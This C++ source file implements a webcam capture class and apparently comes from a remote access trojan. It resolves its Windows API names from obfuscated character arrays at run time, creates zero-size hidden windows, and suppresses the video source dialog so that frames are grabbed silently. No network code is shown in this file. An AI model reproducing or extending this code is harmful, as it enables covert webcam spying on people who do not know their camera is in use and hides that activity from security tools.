// VideoCap.cpp: implementation of the CVideoCap class.
//
//////////////////////////////////////////////////////////////////////
#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include "VideoCap.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////
typedef BOOL 
(VFWAPI 
*capGetDriverDescriptionAT)(
    UINT wDriverIndex,
    LPSTR lpszName, int cbName,
    LPSTR lpszVer, int cbVer
    );

typedef HWND 
(VFWAPI 
*capCreateCaptureWindowAT)(
     LPCSTR lpszWindowName,
     DWORD dwStyle,
     int x, 
     int y, 
     int nWidth, 
     int nHeight,
     HWND hwndParent, 
     int nID);

//////////////////////////////////////////////////////////////////////
bool CVideoCap::m_bIsConnected = false;

CVideoCap::CVideoCap()
{
	// If FALSE, the system automatically resets the state to nonsignaled after a single waiting thread has been released.
	char BrmAP29[] = {'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	m_hCaptureEvent = pCreateEventA(NULL, FALSE, FALSE, NULL);

	m_lpbmi = NULL;
	m_lpDIB = NULL;


	if (!IsWebCam() || m_bIsConnected)
		return;
	m_hWnd = CreateWindow("#32770", /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	char DYrEN16[] = {'c','a','p','C','r','e','a','t','e','C','a','p','t','u','r','e','W','i','n','d','o','w','A','\0'};
	capCreateCaptureWindowAT pcapCreateCaptureWindowA=(capCreateCaptureWindowAT)GetProcAddress(LoadLibrary("AVICAP32.dll"),DYrEN16);
	m_hWndCap = pcapCreateCaptureWindowA
		(
		"CVideoCap", 
		WS_CHILD | WS_VISIBLE,
		0,
		0,
		0,
		0,
		m_hWnd,
		0
		);
}

CVideoCap::~CVideoCap()
{
	if (m_bIsConnected)
	{
		capCaptureAbort(m_hWndCap);
		capDriverDisconnect(m_hWndCap);

		if (m_lpbmi)
			delete m_lpbmi;
		if (m_lpDIB)
			delete m_lpDIB;
		m_bIsConnected = false;
	}

	capSetCallbackOnError(m_hWndCap, NULL);
	capSetCallbackOnFrame(m_hWndCap, NULL);	

    char CtxPW61[] = {'C','l','o','s','e','W','i','n','d','o','w','\0'};
    CloseWindowT pCloseWindow=(CloseWindowT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW61);
	pCloseWindow(m_hWnd);
	pCloseWindow(m_hWndCap);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(m_hCaptureEvent);
}
// 自定义错误,不让弹出视频源对话框
LRESULT CALLBACK CVideoCap::capErrorCallback(HWND hWnd,	int nID, LPCSTR lpsz)
{
	return (LRESULT)TRUE;
}

LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
{
	char BrmAP23[] = {'S','e','t','E','v','e','n','t','\0'};
	SetEventT pSetEvent=(SetEventT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP23);
	try
	{
		CVideoCap *pThis = (CVideoCap *)capGetUserData(hWnd);
		if (pThis != NULL)
		{
			Gyfunction->my_memcpy(pThis->m_lpDIB, lpVHdr->lpData, pThis->m_lpbmi->bmiHeader.biSizeImage);
			pSetEvent(pThis->m_hCaptureEvent);
		}
	}catch(...){};
	return 0;
}

BOOL CVideoCap::IsWebCam()
{
	// 已经连接了
	if (m_bIsConnected)
		return false;

	BOOL	bRet = false;
	
	char	lpszName[100], lpszVer[50];

	char DYrEN15[] = {'c','a','p','G','e','t','D','r','i','v','e','r','D','e','s','c','r','i','p','t','i','o','n','A','\0'};
	capGetDriverDescriptionAT pcapGetDriverDescriptionA=(capGetDriverDescriptionAT)GetProcAddress(LoadLibrary("AVICAP32.dll"),DYrEN15);
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = pcapGetDriverDescriptionA(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

LPBYTE CVideoCap::GetDIB()
{
	capGrabFrameNoStop(m_hWndCap);
	char CPolQ01[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
	WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ01);
	DWORD	dwRet = pWaitForSingleObject(m_hCaptureEvent, 3000);

	if (dwRet == WAIT_OBJECT_0)
		return m_lpDIB;
	else
		return NULL;
}

bool CVideoCap::Initialize(int nWidth, int nHeight)
{
//	CAPTUREPARMS	gCapTureParms ; //视频驱动器的能力
	CAPDRIVERCAPS	gCapDriverCaps;
	DWORD			dwSize;

	if (!IsWebCam())
		return false;

	capSetUserData(m_hWndCap, this);
	
	capSetCallbackOnError(m_hWndCap, capErrorCallback);
	if (!capSetCallbackOnFrame(m_hWndCap, FrameCallbackProc))
	{
		return false;
	}

	// 将捕获窗同驱动器连接
	int i;
	for (i = 0; i < 10; i++)
	{
		if (capDriverConnect(m_hWndCap, i))
			break;
	}
	if (i == 10)
		return false;
	
	
	dwSize = capGetVideoFormatSize(m_hWndCap);
	m_lpbmi = new BITMAPINFO;

	// M263只支持176*144 352*288 (352*288 24彩的试验只支持biPlanes = 1)
	capGetVideoFormat(m_hWndCap, m_lpbmi, dwSize);
	// 采用指定的大小
	if (nWidth && nHeight)
	{
 		m_lpbmi->bmiHeader.biWidth = nWidth;
 		m_lpbmi->bmiHeader.biHeight = nHeight;
		m_lpbmi->bmiHeader.biPlanes = 1;
		m_lpbmi->bmiHeader.biSizeImage = (((m_lpbmi->bmiHeader.biWidth * m_lpbmi->bmiHeader.biBitCount + 31) & ~31) >> 3) * m_lpbmi->bmiHeader.biHeight;
		// 实验得知一些摄像头不支持指定的分辩率
 		if (!capSetVideoFormat(m_hWndCap, m_lpbmi, sizeof(BITMAPINFO)))
			return false;
	}

	m_lpDIB = new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	capDriverGetCaps(m_hWndCap, &gCapDriverCaps, sizeof(CAPDRIVERCAPS));
	
	capOverlay(m_hWndCap, FALSE);
	capPreview(m_hWndCap, FALSE);	
	capPreviewScale(m_hWndCap, FALSE);

	m_bIsConnected = true;

	return true;
}
